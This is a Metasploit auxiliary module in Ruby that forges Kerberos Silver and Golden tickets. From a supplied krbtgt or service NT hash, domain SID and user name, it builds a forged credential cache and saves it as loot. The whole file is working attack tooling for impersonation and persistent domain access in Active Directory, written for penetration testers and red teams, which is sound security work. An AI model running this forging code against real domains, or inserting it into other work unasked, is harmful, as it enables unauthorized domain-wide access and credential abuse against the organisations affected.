##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Kerberos::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kerberos Silver/Golden Ticket Forging',
        'Description' => %q{
          This module forges a Kerberos ticket
        },
        'Author' => [
          'Dean Welch', # Metasploit Module
          'Benjamin Delpy' # Original Implementation

        ],
        'References' => [
          %w[URL https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it]
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [],
          'Reliability' => [],
          'AKA' => ['Silver Ticket', 'Golden Ticket', 'Ticketer']
        },
        'Actions' => [
          ['SILVER', { 'Description' => 'Forge a Silver Ticket' } ],
          ['GOLDEN', { 'Description' => 'Forge a Golden Ticket' } ],
        ]
      )
    )

    register_options(
      [
        OptString.new('USER', [ true, 'The Domain User' ]),
        OptString.new('NTHASH', [ true, 'The krbtgt/service nthash' ]),
        OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
        OptString.new('DOMAIN_SID', [ true, 'The Domain SID, Ex: S-1-5-21-1755879683-3641577184-3486455962-1000']),
        OptString.new('SPN', [ false, 'The Service Principal Name'])
      ]
    )
    deregister_options('RHOSTS', 'RPORT', 'Timeout')
  end

  def run
    case action.name
    when 'SILVER'
      forge_silver_ticket
    when 'GOLDEN'
      forge_golden_ticket
    end
  end

  def forge_silver_ticket
    cache = create_silver_ticket(nt_hash: datastore['NTHASH'],
                                 domain_sid: datastore['DOMAIN_SID'],
                                 domain: datastore['DOMAIN'],
                                 spn: datastore['SPN'],
                                 username: datastore['USER'])
    path = store_loot('silver_ticket.ccache', 'application/octet-stream', datastore['DOMAIN'], cache.encode)
    print_good("MIT Credential Cache saved on #{path}")
  end

  def forge_golden_ticket
    cache = create_golden_ticket(nt_hash: datastore['NTHASH'],
                                 domain_sid: datastore['DOMAIN_SID'],
                                 domain: datastore['DOMAIN'],
                                 username: datastore['USER'])
    path = store_loot('golden_ticket.ccache', 'application/octet-stream', datastore['DOMAIN'], cache.encode)
    print_good("MIT Credential Cache saved on #{path}")
  end
end
